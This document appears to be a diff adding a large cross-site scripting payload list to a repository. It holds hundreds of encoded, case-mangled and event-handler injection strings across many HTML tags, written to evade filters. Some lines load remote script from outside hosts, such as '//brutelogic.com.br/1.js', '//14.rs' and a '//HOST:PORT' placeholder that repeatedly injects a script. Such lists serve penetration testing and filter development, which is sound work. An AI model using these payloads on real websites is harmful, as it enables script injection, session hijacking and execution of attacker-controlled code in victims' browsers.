@@ -1,0 +1,2377 @@
+\" onfocus=alert('00') \"
+\" onhover=alert('01') \"
+<scRipt>alert('02')</scRipt>
+<img src=# onerror=alert('03') >
+%5C%22%20onfocus%3Dalert%28%2704%27%29%20%5C%22
+%5C%22%20onhover%3Dalert%28%2705%27%29%20%5C%22
+%3CscRipt%3Ealert%28%2706%27%29%3C%2FscRipt%3E
+%3Cimg%20src%3D%23%20onerror%3Dalert%28%2707%27%29%20%3E
+&bsol;&quot; onfocus&equals;alert&lpar;&apos;08&apos;&rpar; &bsol;&quot;
+&bsol;&quot; onhover&equals;alert&lpar;&apos;09&apos;&rpar; &bsol;&quot;
+&lt;scRipt&gt;alert&lpar;&apos;10&apos;&rpar;&lt;&sol;scRipt&gt;
+&lt;img src&equals;&num; onerror&equals;alert&lpar;&apos;11&apos;&rpar; &gt;
+<Script>eval(2*3)</scripT>
+%3CScript%3Eeval%283%2A3%29%3C%2FscripT%3E
+%253CScript%253Eeval%25284%252A3%2529%253C%252FscripT%253E
+&lt;&#83;&#99;&#114;&#105;&#112;&#116;&gt;&#101;&#118;&#97;&#108;&lpar;&#53;&ast;&#51;&rpar;&lt;&sol;&#115;&#99;&#114;&#105;&#112;&#84;&gt;
+&amp;&#108;&#116;&semi;&amp;&num;&#56;&#51;&semi;&amp;&num;&#57;&#57;&semi;&amp;&num;&#49;&#49;&#52;&semi;&amp;&num;&#49;&#48;&#53;&semi;&amp;&num;&#49;&#49;&#50;&semi;&amp;&num;&#49;&#49;&#54;&semi;&amp;&#103;&#116;&semi;&amp;&num;&#49;&#48;&#49;&semi;&amp;&num;&#49;&#49;&#56;&semi;&amp;&num;&#57;&#55;&semi;&amp;&num;&#49;&#48;&#56;&semi;&amp;&#108;&#112;&#97;&#114;&semi;&amp;&num;&#53;&#52;&semi;&amp;&#97;&#115;&#116;&semi;&amp;&num;&#53;&#49;&semi;&amp;&#114;&#112;&#97;&#114;&semi;&amp;&#108;&#116;&semi;&amp;&#115;&#111;&#108;&semi;&amp;&num;&#49;&#49;&#53;&semi;&amp;&num;&#57;&#57;&semi;&amp;&num;&#49;&#49;&#52;&semi;&amp;&num;&#49;&#48;&#53;&semi;&amp;&num;&#49;&#49;&#50;&semi;&amp;&num;&#56;&#52;&semi;&amp;&#103;&#116;&semi;
+&percnt;&#51;&#67;&#83;&#99;&#114;&#105;&#112;&#116;&percnt;&#51;&#69;&#101;&#118;&#97;&#108;&percnt;&#50;&#56;&#55;&percnt;&#50;&#65;&#51;&percnt;&#50;&#57;&percnt;&#51;&#67;&percnt;&#50;&#70;&#115;&#99;&#114;&#105;&#112;&#84;&percnt;&#51;&#69;
+%26lt%3B%26%2383%3B%26%2399%3B%26%23114%3B%26%23105%3B%26%23112%3B%26%23116%3B%26gt%3B%26%23101%3B%26%23118%3B%26%2397%3B%26%23108%3B%26lpar%3B%26%2356%3B%26ast%3B%26%2351%3B%26rpar%3B%26lt%3B%26sol%3B%26%23115%3B%26%2399%3B%26%23114%3B%26%23105%3B%26%23112%3B%26%2384%3B%26gt%3B
+<A/hREf=\"j%0aavas%09cript%0a:%09con%0afirm%0d``\">z
+<d3\"<\"/onclick=\"1>[confirm``]\"<\">z
+<d3/onmouseenter=[2].find(confirm)>z
+<details open ontoggle=confirm()>
+<sciPt y=\"><\">/*<sciPt* */prompt()</sciPt
+<w=\"/x=\"y>\"/ondblclick=`<`[confir\u006d``]>z
+<a href=\"javasciPt%26colon;alert(1)\">click
+<a href=javas&#99;ript:alert(1)>click
+<sciPt/\"<a\"/src=data:=\".<a,[8].some(confirm)>
+<svg/x=\">\"/onload=confirm()//
+<!--><sciPt src=//14.rs>
+<x oncut=alert()>x
+\"-eval(\"window['pro'%2B'mpt'](8)\")-\"
+\"onclick=prompt(8)>\"@x.y
+\"onclick=prompt(8)><svg/onload=prompt(8)>\"@x.y
+<image/src/onerror=prompt(8)>
+<img/src/onerror=prompt(8)>
+<image src/onerror=prompt(8)>
+<image src =q onerror=prompt(8)>
+<img src =q onerror=prompt(8)>
+</scrip</sciPt>t><img src =q onerror=prompt(8)>
+<svg onload=alert(1)>
+\"autofocus/onfocus=alert(1)//
+</sciPt><svg onload=alert(1)>
+<x onclick=alert(1)>click this! 
+<x oncopy=alert(1)>copy this! 
+<x oncontextmenu=alert(1)>right click this! 
+<x ondblclick=alert(1)>double click this! 
+<x contenteditable onfocus=alert(1)>focus this! 
+<x contenteditable onkeydown=alert(1)>press any key! 
+<sciPt>alert(1)// 
+<sciPt>alert(1)<!
+<sciPt src=//brutelogic.com.br/1.js> 
+<sciPt src=//3334957647/1>
+%3Cx onxxx=alert(1) 
+<%78 onxxx=1 
+<x %6Fnxxx=1 
+<x o%6Exxx=1 
+<x on%78xx=1 
+<x onxxx%3D1
+<X onxxx=1 
+<x OnXxx=1 
+<X OnXxx=1 
+<x onxxx=1 onxxx=1
+<x/onxxx=1 
+<x%09onxxx=1 
+<x%0Aonxxx=1 
+<x%0Conxxx=1 
+<x%0Donxxx=1 
+<x%2Fonxxx=1 
+<x 1='1'onxxx=1 
+<x 1=\"1\"onxxx=1
+<x </onxxx=1 
+<x 1=\">\" onxxx=1 
+<http://onxxx%3D1/
+<svg onload=setInterval(function(){with(document)body.appendChild(createElement('sciPt')).src='//HOST:PORT'},0)>
+<sciPt>alert(1)</sciPt> 
+<sciPt src=javasciPt:alert(1)> 
+<object data=javasciPt:alert(1)> 
+<math><brute xlink:href=javasciPt:alert(1)>click 
+<svg><a xmlns:xlink=http://www.w3.org/1999/xlink xlink:href=?><circle r=400 /><animate attributeName=xlink:href begin=0 from=javasciPt:alert(1) to=&>
+<html ontouchstart=alert(1)> 
+<html ontouchcancel=alert(1)>
+GIF89a/*<svg/onload=alert(1)>*/=alert(document.domain)//;
+\"><sciPt src=//brutelogic.com.br&sol;1.js&num; 
+<link rel=import href=\"data:text/html&comma;&lt;sciPt&gt;alert(1)&lt;&sol;sciPt&gt; 
+\"><link rel=import href=data:text/html&comma;&lt;sciPt&gt;alert(1)&lt;&sol;sciPt&gt;
+<base href=//0>
+<sciPt/src=\"data:&comma;eval(atob(location.hash.slice(1)))//#alert(1)
+<body onload=alert(1)>
+<body onpageshow=alert(1)>
+<body onfocus=alert(1)>
+<body onhashchange=alert(1)><a href=#x>click this!#x
+<body style=overflow:auto;height:1000px onscroll=alert(1) id=x>#x
+<body onscroll=alert(1)><br><br><br><br>
+<br><br><br><br><br><br><br><br><br><br>
+<br><br><br><br><br><br><x id=x>#x
+<body onresize=alert(1)>press F12!
+<body onhelp=alert(1)>press F1! (MSIE)
+<marquee onstart=alert(1)>
+<marquee loop=1 width=0 onfinish=alert(1)>
+<audio src onloadstart=alert(1)>
+<video onloadstart=alert(1)><source>
+<input autofocus onblur=alert(1)>
+<keygen autofocus onfocus=alert(1)>
+<form onsubmit=alert(1)><input type=submit>
+<select onchange=alert(1)><option>1<option>2
+<menu id=x contextmenu=x onshow=alert(1)>right click me!
+alert`1`
+alert&lpar;1&rpar;
+alert&#x28;1&#x29
+alert&#40;1&#41
+(alert)(1)
+a=alert,a(1)
+[1].find(alert)
+top[\"al\"+\"ert\"](1)
+top[/al/.source+/ert/.source](1)
+al\u0065rt(1)
+navigator.vibrate(500)
+eval(URL.slice(-8))>#alert(1)
+eval(location.hash.slice(1)>#alert(1)
+<a draggable=\"true\" ondrag=\"alert(1)\">test</a>
+<a draggable=\"true\" ondragend=\"alert(1)\">test</a>
+<a draggable=\"true\" ondragstart=\"alert(1)\">test</a>
+<a id=x tabindex=1 onactivate=alert(1)></a>
+<a id=x tabindex=1 onfocusin=alert(1)></a>
+<a onbeforecopy=\"alert(1)\" contenteditable>test</a>
+<a onkeypress=\"alert(1)\" contenteditable>test</a>
+<a onmouseover=\"alert(1)\">test</a>
+<a onmouseup=\"alert(1)\">test</a>
+<abbr draggable=\"true\" ondrag=\"alert(1)\">test</abbr>
+<abbr draggable=\"true\" ondragenter=\"alert(1)\">test</abbr>
+<abbr draggable=\"true\" ondragleave=\"alert(1)\">test</abbr>
+<abbr draggable=\"true\" ondragstart=\"alert(1)\">test</abbr>
+<abbr id=x tabindex=1 onactivate=alert(1)></abbr>
+<abbr id=x tabindex=1 ondeactivate=alert(1)></abbr><input id=y autofocus>
+<abbr id=x tabindex=1 onfocus=alert(1)></abbr>
+<abbr id=x tabindex=1 onfocusin=alert(1)></abbr>
+<abbr onbeforecut=\"alert(1)\" contenteditable>test</abbr>
+<abbr onbeforepaste=\"alert(1)\" contenteditable>test</abbr>
+<abbr oncontextmenu=\"alert(1)\">test</abbr>
+<abbr oncopy=\"alert(1)\" contenteditable>test</abbr>
+<abbr oncut=\"alert(1)\" contenteditable>test</abbr>
+<abbr ondblclick=\"alert(1)\">test</abbr>
+<abbr onfocusout=alert(1) tabindex=1 id=x></abbr><input autofocus>
+<abbr onkeydown=\"alert(1)\" contenteditable>test</abbr>
+<abbr onkeypress=\"alert(1)\" contenteditable>test</abbr>
+<abbr onmouseenter=\"alert(1)\">test</abbr>
+<abbr onmouseleave=\"alert(1)\">test</abbr>
+<abbr onmousemove=\"alert(1)\">test</abbr>
+<abbr onmouseout=\"alert(1)\">test</abbr>
+<abbr onmouseup=\"alert(1)\">test</abbr>
+<acronym draggable=\"true\" ondrag=\"alert(1)\">test</acronym>
+<acronym draggable=\"true\" ondragenter=\"alert(1)\">test</acronym>
+<acronym id=x tabindex=1 onactivate=alert(1)></acronym>
+<acronym id=x tabindex=1 onbeforedeactivate=alert(1)></acronym><input autofocus>
+<acronym id=x tabindex=1 ondeactivate=alert(1)></acronym><input id=y autofocus>
+<acronym id=x tabindex=1 onfocus=alert(1)></acronym>
+<acronym oncopy=\"alert(1)\" contenteditable>test</acronym>
+<acronym ondblclick=\"alert(1)\">test</acronym>
+<acronym onfocusout=alert(1) tabindex=1 id=x></acronym><input autofocus>
+<acronym onkeypress=\"alert(1)\" contenteditable>test</acronym>
+<acronym onmousedown=\"alert(1)\">test</acronym>
+<acronym onmouseleave=\"alert(1)\">test</acronym>
+<acronym onmouseout=\"alert(1)\">test</acronym>
+<acronym onmouseover=\"alert(1)\">test</acronym>
+<acronym onmouseup=\"alert(1)\">test</acronym>
+<address draggable=\"true\" ondrag=\"alert(1)\">test</address>
+<address draggable=\"true\" ondragleave=\"alert(1)\">test</address>
+<address id=x tabindex=1 onactivate=alert(1)></address>
+<address id=x tabindex=1 onbeforedeactivate=alert(1)></address><input autofocus>
+<address id=x tabindex=1 onfocus=alert(1)></address>
+<address id=x tabindex=1 onfocusin=alert(1)></address>
+<address onbeforecut=\"alert(1)\" contenteditable>test</address>
+<address onbeforepaste=\"alert(1)\" contenteditable>test</address>
+<address onblur=alert(1) tabindex=1 id=x></address><input autofocus>
+<address oncontextmenu=\"alert(1)\">test</address>
+<address oncopy=\"alert(1)\" contenteditable>test</address>
+<address ondblclick=\"alert(1)\">test</address>
+<address onfocusout=alert(1) tabindex=1 id=x></address><input autofocus>
+<address onkeydown=\"alert(1)\" contenteditable>test</address>
+<address onkeypress=\"alert(1)\" contenteditable>test</address>
+<address onmousedown=\"alert(1)\">test</address>
+<address onmouseenter=\"alert(1)\">test</address>
+<address onmouseout=\"alert(1)\">test</address>
+<address onpaste=\"alert(1)\" contenteditable>test</address>
+<applet draggable=\"true\" ondragend=\"alert(1)\">test</applet>
+<applet draggable=\"true\" ondragleave=\"alert(1)\">test</applet>
+<applet draggable=\"true\" ondragstart=\"alert(1)\">test</applet>
+<applet id=x tabindex=1 onbeforeactivate=alert(1)></applet>
+<applet id=x tabindex=1 onbeforedeactivate=alert(1)></applet><input autofocus>
+<applet id=x tabindex=1 ondeactivate=alert(1)></applet><input id=y autofocus>
+<applet id=x tabindex=1 onfocus=alert(1)></applet>
+<applet onbeforecopy=\"alert(1)\" contenteditable>test</applet>
+<applet onbeforepaste=\"alert(1)\" contenteditable>test</applet>
+<applet onblur=alert(1) tabindex=1 id=x></applet><input autofocus>
+<applet oncopy=\"alert(1)\" contenteditable>test</applet>
+<applet oncut=\"alert(1)\" contenteditable>test</applet>
+<applet ondblclick=\"alert(1)\">test</applet>
+<applet onkeydown=\"alert(1)\" contenteditable>test</applet>
+<applet onkeypress=\"alert(1)\" contenteditable>test</applet>
+<applet onkeyup=\"alert(1)\" contenteditable>test</applet>
+<applet onmouseenter=\"alert(1)\">test</applet>
+<applet onpaste=\"alert(1)\" contenteditable>test</applet>
+<area draggable=\"true\" ondrag=\"alert(1)\">test</area>
+<area draggable=\"true\" ondragenter=\"alert(1)\">test</area>
+<area draggable=\"true\" ondragleave=\"alert(1)\">test</area>
+<area id=x tabindex=1 onbeforeactivate=alert(1)></area>
+<area id=x tabindex=1 ondeactivate=alert(1)></area><input id=y autofocus>
+<area onbeforepaste=\"alert(1)\" contenteditable>test</area>
+<area onclick=\"alert(1)\">test</area>
+<area oncontextmenu=\"alert(1)\">test</area>
+<area oncopy=\"alert(1)\" contenteditable>test</area>
+<area onkeypress=\"alert(1)\" contenteditable>test</area>
+<area onmouseleave=\"alert(1)\">test</area>
+<area onmouseout=\"alert(1)\">test</area>
+<area onmouseover=\"alert(1)\">test</area>
+<area onmouseup=\"alert(1)\">test</area>
+<article draggable=\"true\" ondragenter=\"alert(1)\">test</article>
+<article draggable=\"true\" ondragstart=\"alert(1)\">test</article>
+<article id=x tabindex=1 onbeforeactivate=alert(1)></article>
+<article id=x tabindex=1 onbeforedeactivate=alert(1)></article><input autofocus>
+<article onbeforepaste=\"alert(1)\" contenteditable>test</article>
+<article onclick=\"alert(1)\">test</article>
+<article oncontextmenu=\"alert(1)\">test</article>
+<article oncut=\"alert(1)\" contenteditable>test</article>
+<article ondblclick=\"alert(1)\">test</article>
+<article onkeydown=\"alert(1)\" contenteditable>test</article>
+<article onmouseleave=\"alert(1)\">test</article>
+<article onmousemove=\"alert(1)\">test</article>
+<aside draggable=\"true\" ondrag=\"alert(1)\">test</aside>
+<aside draggable=\"true\" ondragend=\"alert(1)\">test</aside>
+<aside draggable=\"true\" ondragstart=\"alert(1)\">test</aside>
+<aside id=x tabindex=1 onactivate=alert(1)></aside>
+<aside id=x tabindex=1 onbeforedeactivate=alert(1)></aside><input autofocus>
+<aside id=x tabindex=1 onfocusin=alert(1)></aside>
+<aside onbeforecopy=\"alert(1)\" contenteditable>test</aside>
+<aside onbeforecut=\"alert(1)\" contenteditable>test</aside>
+<aside onblur=alert(1) tabindex=1 id=x></aside><input autofocus>
+<aside oncopy=\"alert(1)\" contenteditable>test</aside>
+<aside ondblclick=\"alert(1)\">test</aside>
+<aside onfocusout=alert(1) tabindex=1 id=x></aside><input autofocus>
+<aside onkeydown=\"alert(1)\" contenteditable>test</aside>
+<aside onmousedown=\"alert(1)\">test</aside>
+<aside onmouseout=\"alert(1)\">test</aside>
+<aside onmouseover=\"alert(1)\">test</aside>
+<audio autoplay controls onpause=alert(1)><source src=\"validaudio.wav\" type=\"audio/wav\"></audio>
+<audio autoplay controls onseeking=alert(1)><source src=\"validaudio.wav\" type=\"audio/wav\"></audio>
+<audio autoplay onloadedmetadata=alert(1)> <source src=\"validaudio.wav\" type=\"audio/wav\"></audio>
+<audio autoplay onplay=alert(1)><source src=\"validaudio.wav\" type=\"audio/wav\"></audio>
+<audio autoplay onplaying=alert(1)><source src=\"validaudio.wav\" type=\"audio/wav\"></audio>
+<audio controls autoplay ontimeupdate=alert(1)><source src=\"validaudio.wav\" type=\"audio/wav\"></audio>
+<audio draggable=\"true\" ondragend=\"alert(1)\">test</audio>
+<audio draggable=\"true\" ondragleave=\"alert(1)\">test</audio>
+<audio id=x controls onfocusin=alert(1) id=x><source src=\"validaudio.wav\"></audio>
+<audio id=x tabindex=1 ondeactivate=alert(1)></audio><input id=y autofocus>
+<audio onbeforecopy=\"alert(1)\" contenteditable>test</audio>
+<audio onblur=alert(1) tabindex=1 id=x></audio><input autofocus>
+<audio oncontextmenu=\"alert(1)\">test</audio>
+<audio onfocusout=alert(1) tabindex=1 id=x></audio><input autofocus>
+<audio onkeyup=\"alert(1)\" contenteditable>test</audio>
+<audio onmouseenter=\"alert(1)\">test</audio>
+<audio onmouseleave=\"alert(1)\">test</audio>
+<audio onmousemove=\"alert(1)\">test</audio>
+<audio onmouseup=\"alert(1)\">test</audio>
+<b draggable=\"true\" ondrag=\"alert(1)\">test</b>
+<b draggable=\"true\" ondragenter=\"alert(1)\">test</b>
+<b draggable=\"true\" ondragleave=\"alert(1)\">test</b>
+<b id=x tabindex=1 onbeforeactivate=alert(1)></b>
+<b id=x tabindex=1 onbeforedeactivate=alert(1)></b><input autofocus>
+<b onbeforecopy=\"alert(1)\" contenteditable>test</b>
+<b onbeforecut=\"alert(1)\" contenteditable>test</b>
+<b onbeforepaste=\"alert(1)\" contenteditable>test</b>
+<b onblur=alert(1) tabindex=1 id=x></b><input autofocus>
+<b ondblclick=\"alert(1)\">test</b>
+<b onfocusout=alert(1) tabindex=1 id=x></b><input autofocus>
+<b onmouseenter=\"alert(1)\">test</b>
+<b onmouseleave=\"alert(1)\">test</b>
+<b onmouseup=\"alert(1)\">test</b>
+<b onpaste=\"alert(1)\" contenteditable>test</b>
+<base draggable=\"true\" ondragenter=\"alert(1)\">test</base>
+<base draggable=\"true\" ondragleave=\"alert(1)\">test</base>
+<base draggable=\"true\" ondragstart=\"alert(1)\">test</base>
+<base id=x tabindex=1 onactivate=alert(1)></base>
+<base id=x tabindex=1 onbeforeactivate=alert(1)></base>
+<base id=x tabindex=1 ondeactivate=alert(1)></base><input id=y autofocus>
+<base id=x tabindex=1 onfocus=alert(1)></base>
+<base onblur=alert(1) tabindex=1 id=x></base><input autofocus>
+<base onclick=\"alert(1)\">test</base>
+<base oncontextmenu=\"alert(1)\">test</base>
+<base oncopy=\"alert(1)\" contenteditable>test</base>
+<base ondblclick=\"alert(1)\">test</base>
+<base onkeyup=\"alert(1)\" contenteditable>test</base>
+<base onmouseleave=\"alert(1)\">test</base>
+<base onmousemove=\"alert(1)\">test</base>
+<base onmouseover=\"alert(1)\">test</base>
+<basefont draggable=\"true\" ondrag=\"alert(1)\">test</basefont>
+<basefont draggable=\"true\" ondragenter=\"alert(1)\">test</basefont>
+<basefont draggable=\"true\" ondragleave=\"alert(1)\">test</basefont>
+<basefont draggable=\"true\" ondragstart=\"alert(1)\">test</basefont>
+<basefont id=x tabindex=1 onactivate=alert(1)></basefont>
+<basefont id=x tabindex=1 onbeforedeactivate=alert(1)></basefont><input autofocus>
+<basefont id=x tabindex=1 ondeactivate=alert(1)></basefont><input id=y autofocus>
+<basefont id=x tabindex=1 onfocus=alert(1)></basefont>
+<basefont onbeforepaste=\"alert(1)\" contenteditable>test</basefont>
+<basefont onclick=\"alert(1)\">test</basefont>
+<basefont ondblclick=\"alert(1)\">test</basefont>
+<basefont onfocusout=alert(1) tabindex=1 id=x></basefont><input autofocus>
+<basefont onkeydown=\"alert(1)\" contenteditable>test</basefont>
+<basefont onmousedown=\"alert(1)\">test</basefont>
+<basefont onmouseleave=\"alert(1)\">test</basefont>
+<basefont onmouseout=\"alert(1)\">test</basefont>
+<basefont onmouseover=\"alert(1)\">test</basefont>
+<bdi draggable=\"true\" ondrag=\"alert(1)\">test</bdi>
+<bdi draggable=\"true\" ondragend=\"alert(1)\">test</bdi>
+<bdi draggable=\"true\" ondragenter=\"alert(1)\">test</bdi>
+<bdi draggable=\"true\" ondragleave=\"alert(1)\">test</bdi>
+<bdi id=x tabindex=1 onactivate=alert(1)></bdi>
+<bdi id=x tabindex=1 onbeforeactivate=alert(1)></bdi>
+<bdi id=x tabindex=1 onbeforedeactivate=alert(1)></bdi><input autofocus>
+<bdi id=x tabindex=1 ondeactivate=alert(1)></bdi><input id=y autofocus>
+<bdi id=x tabindex=1 onfocus=alert(1)></bdi>
+<bdi id=x tabindex=1 onfocusin=alert(1)></bdi>
+<bdi onbeforecopy=\"alert(1)\" contenteditable>test</bdi>
+<bdi onbeforecut=\"alert(1)\" contenteditable>test</bdi>
+<bdi onclick=\"alert(1)\">test</bdi>
+<bdi oncopy=\"alert(1)\" contenteditable>test</bdi>
+<bdi ondblclick=\"alert(1)\">test</bdi>
+<bdi onkeydown=\"alert(1)\" contenteditable>test</bdi>
+<bdi onkeypress=\"alert(1)\" contenteditable>test</bdi>
+<bdi onkeyup=\"alert(1)\" contenteditable>test</bdi>
+<bdi onmouseenter=\"alert(1)\">test</bdi>
+<bdi onmousemove=\"alert(1)\">test</bdi>
+<bdi onmouseout=\"alert(1)\">test</bdi>
+<bdi onmouseover=\"alert(1)\">test</bdi>
+<bdi onpaste=\"alert(1)\" contenteditable>test</bdi>
+<bdo draggable=\"true\" ondrag=\"alert(1)\">test</bdo>
+<bdo draggable=\"true\" ondragend=\"alert(1)\">test</bdo>
+<bdo draggable=\"true\" ondragleave=\"alert(1)\">test</bdo>
+<bdo id=x tabindex=1 onbeforeactivate=alert(1)></bdo>
+<bdo id=x tabindex=1 ondeactivate=alert(1)></bdo><input id=y autofocus>
+<bdo onclick=\"alert(1)\">test</bdo>
+<bdo oncut=\"alert(1)\" contenteditable>test</bdo>
+<bdo ondblclick=\"alert(1)\">test</bdo>
+<bdo onfocusout=alert(1) tabindex=1 id=x></bdo><input autofocus>
+<bdo onkeyup=\"alert(1)\" contenteditable>test</bdo>
+<bdo onmousedown=\"alert(1)\">test</bdo>
+<bdo onmousemove=\"alert(1)\">test</bdo>
+<bdo onpaste=\"alert(1)\" contenteditable>test</bdo>
+<bgsound draggable=\"true\" ondrag=\"alert(1)\">test</bgsound>
+<bgsound draggable=\"true\" ondragend=\"alert(1)\">test</bgsound>
+<bgsound id=x tabindex=1 onactivate=alert(1)></bgsound>
+<bgsound id=x tabindex=1 onbeforeactivate=alert(1)></bgsound>
+<bgsound id=x tabindex=1 onbeforedeactivate=alert(1)></bgsound><input autofocus>
+<bgsound id=x tabindex=1 ondeactivate=alert(1)></bgsound><input id=y autofocus>
+<bgsound id=x tabindex=1 onfocus=alert(1)></bgsound>
+<bgsound onbeforecopy=\"alert(1)\" contenteditable>test</bgsound>
+<bgsound onblur=alert(1) tabindex=1 id=x></bgsound><input autofocus>
+<bgsound onclick=\"alert(1)\">test</bgsound>
+<bgsound oncopy=\"alert(1)\" contenteditable>test</bgsound>
+<bgsound oncut=\"alert(1)\" contenteditable>test</bgsound>
+<bgsound ondblclick=\"alert(1)\">test</bgsound>
+<bgsound onfocusout=alert(1) tabindex=1 id=x></bgsound><input autofocus>
+<bgsound onkeydown=\"alert(1)\" contenteditable>test</bgsound>
+<bgsound onkeypress=\"alert(1)\" contenteditable>test</bgsound>
+<bgsound onkeyup=\"alert(1)\" contenteditable>test</bgsound>
+<bgsound onmousedown=\"alert(1)\">test</bgsound>
+<bgsound onmouseenter=\"alert(1)\">test</bgsound>
+<bgsound onmouseout=\"alert(1)\">test</bgsound>
+<bgsound onmouseup=\"alert(1)\">test</bgsound>
+<bgsound onpaste=\"alert(1)\" contenteditable>test</bgsound>
+<big draggable=\"true\" ondrag=\"alert(1)\">test</big>
+<big draggable=\"true\" ondragend=\"alert(1)\">test</big>
+<big draggable=\"true\" ondragleave=\"alert(1)\">test</big>
+<big draggable=\"true\" ondragstart=\"alert(1)\">test</big>
+<big id=x tabindex=1 onbeforeactivate=alert(1)></big>
+<big id=x tabindex=1 ondeactivate=alert(1)></big><input id=y autofocus>
+<big id=x tabindex=1 onfocus=alert(1)></big>
+<big onbeforecopy=\"alert(1)\" contenteditable>test</big>
+<big onbeforecut=\"alert(1)\" contenteditable>test</big>
+<big onbeforepaste=\"alert(1)\" contenteditable>test</big>
+<big onblur=alert(1) tabindex=1 id=x></big><input autofocus>
+<big onclick=\"alert(1)\">test</big>
+<big oncontextmenu=\"alert(1)\">test</big>
+<big onkeydown=\"alert(1)\" contenteditable>test</big>
+<big onkeyup=\"alert(1)\" contenteditable>test</big>
+<big onmousedown=\"alert(1)\">test</big>
+<big onmouseleave=\"alert(1)\">test</big>
+<big onmousemove=\"alert(1)\">test</big>
+<big onmouseup=\"alert(1)\">test</big>
+<blink draggable=\"true\" ondragend=\"alert(1)\">test</blink>
+<blink draggable=\"true\" ondragenter=\"alert(1)\">test</blink>
+<blink draggable=\"true\" ondragleave=\"alert(1)\">test</blink>
+<blink onbeforecopy=\"alert(1)\" contenteditable>test</blink>
+<blink onbeforepaste=\"alert(1)\" contenteditable>test</blink>
+<blink onblur=alert(1) tabindex=1 id=x></blink><input autofocus>
+<blink oncontextmenu=\"alert(1)\">test</blink>
+<blink oncut=\"alert(1)\" contenteditable>test</blink>
+<blink ondblclick=\"alert(1)\">test</blink>
+<blink onfocusout=alert(1) tabindex=1 id=x></blink><input autofocus>
+<blink onkeydown=\"alert(1)\" contenteditable>test</blink>
+<blink onkeyup=\"alert(1)\" contenteditable>test</blink>
+<blink onmouseout=\"alert(1)\">test</blink>
+<blink onmouseup=\"alert(1)\">test</blink>
+<blink onpaste=\"alert(1)\" contenteditable>test</blink>
+<blockquote draggable=\"true\" ondrag=\"alert(1)\">test</blockquote>
+<blockquote draggable=\"true\" ondragend=\"alert(1)\">test</blockquote>
+<blockquote draggable=\"true\" ondragstart=\"alert(1)\">test</blockquote>
+<blockquote id=x tabindex=1 onactivate=alert(1)></blockquote>
+<blockquote id=x tabindex=1 onbeforeactivate=alert(1)></blockquote>
+<blockquote id=x tabindex=1 onbeforedeactivate=alert(1)></blockquote><input autofocus>
+<blockquote id=x tabindex=1 onfocusin=alert(1)></blockquote>
+<blockquote onbeforecopy=\"alert(1)\" contenteditable>test</blockquote>
+<blockquote onblur=alert(1) tabindex=1 id=x></blockquote><input autofocus>
+<blockquote oncut=\"alert(1)\" contenteditable>test</blockquote>
+<blockquote onfocusout=alert(1) tabindex=1 id=x></blockquote><input autofocus>
+<blockquote onkeypress=\"alert(1)\" contenteditable>test</blockquote>
+<blockquote onmouseleave=\"alert(1)\">test</blockquote>
+<blockquote onmouseout=\"alert(1)\">test</blockquote>
+<blockquote onmouseover=\"alert(1)\">test</blockquote>
+<blockquote onmouseup=\"alert(1)\">test</blockquote>
+<blockquote onpaste=\"alert(1)\" contenteditable>test</blockquote>
+<body draggable=\"true\" ondrag=\"alert(1)\">test</body>
+<body draggable=\"true\" ondragend=\"alert(1)\">test</body>
+<body draggable=\"true\" ondragenter=\"alert(1)\">test</body>
+<body draggable=\"true\" ondragleave=\"alert(1)\">test</body>
+<body id=x tabindex=1 onbeforeactivate=alert(1)></body>
+<body id=x tabindex=1 onfocusin=alert(1)></body>
+<body onafterprint=alert(1)>
+<body onbeforecopy=\"alert(1)\" contenteditable>test</body>
+<body oncontextmenu=\"alert(1)\">test</body>
+<body oncut=\"alert(1)\" contenteditable>test</body>
+<body ondblclick=\"alert(1)\">test</body>
+<body onerror=alert(1) onload=/>
+<body onfocusout=alert(1) id=x><iframe id=x>
+<body onhashchange=\"alert(1)\">
+<body onkeydown=\"alert(1)\" contenteditable>test</body>
+<body onkeypress=\"alert(1)\" contenteditable>test</body>
+<body onmousedown=\"alert(1)\">test</body>
+<body onmouseenter=\"alert(1)\">test</body>
+<body onmouseleave=\"alert(1)\">test</body>
+<body onmouseout=\"alert(1)\">test</body>
+<body onmouseover=\"alert(1)\">test</body>
+<body onpaste=\"alert(1)\" contenteditable>test</body>
+<body onpopstate=alert(1)>
+<body onscroll=alert(1)><div style=height:1000px></div><div id=x></div>
+<body onwheel=alert(1)>
+<br draggable=\"true\" ondragend=\"alert(1)\">test</br>
+<br draggable=\"true\" ondragenter=\"alert(1)\">test</br>
+<br draggable=\"true\" ondragleave=\"alert(1)\">test</br>
+<br draggable=\"true\" ondragstart=\"alert(1)\">test</br>
+<br id=x tabindex=1 onbeforedeactivate=alert(1)></br><input autofocus>
+<br id=x tabindex=1 onfocusin=alert(1)></br>
+<br onbeforecopy=\"alert(1)\" contenteditable>test</br>
+<br onbeforepaste=\"alert(1)\" contenteditable>test</br>
+<br oncontextmenu=\"alert(1)\">test</br>
+<br oncopy=\"alert(1)\" contenteditable>test</br>
+<br oncut=\"alert(1)\" contenteditable>test</br>
+<br onmousedown=\"alert(1)\">test</br>
+<br onmouseout=\"alert(1)\">test</br>
+<button draggable=\"true\" ondrag=\"alert(1)\">test</button>
+<button draggable=\"true\" ondragleave=\"alert(1)\">test</button>
+<button draggable=\"true\" ondragstart=\"alert(1)\">test</button>
+<button id=x tabindex=1 onactivate=alert(1)></button>
+<button id=x tabindex=1 onbeforedeactivate=alert(1)></button><input autofocus>
+<button onbeforecopy=\"alert(1)\" contenteditable>test</button>
+<button onblur=alert(1) id=x></button><input autofocus>
+<button oncontextmenu=\"alert(1)\">test</button>
+<button onkeydown=\"alert(1)\" contenteditable>test</button>
+<button onkeyup=\"alert(1)\" contenteditable>test</button>
+<button onmousedown=\"alert(1)\">test</button>
+<button onmouseenter=\"alert(1)\">test</button>
+<button onmouseout=\"alert(1)\">test</button>
+<button onmouseover=\"alert(1)\">test</button>
+<button onmouseup=\"alert(1)\">test</button>
+<button onpaste=\"alert(1)\" contenteditable>test</button>
+<canvas draggable=\"true\" ondrag=\"alert(1)\">test</canvas>
+<canvas draggable=\"true\" ondragend=\"alert(1)\">test</canvas>
+<canvas draggable=\"true\" ondragenter=\"alert(1)\">test</canvas>
+<canvas draggable=\"true\" ondragstart=\"alert(1)\">test</canvas>
+<canvas id=x tabindex=1 onbeforeactivate=alert(1)></canvas>
+<canvas id=x tabindex=1 ondeactivate=alert(1)></canvas><input id=y autofocus>
+<canvas onbeforecopy=\"alert(1)\" contenteditable>test</canvas>
+<canvas oncontextmenu=\"alert(1)\">test</canvas>
+<canvas oncut=\"alert(1)\" contenteditable>test</canvas>
+<canvas ondblclick=\"alert(1)\">test</canvas>
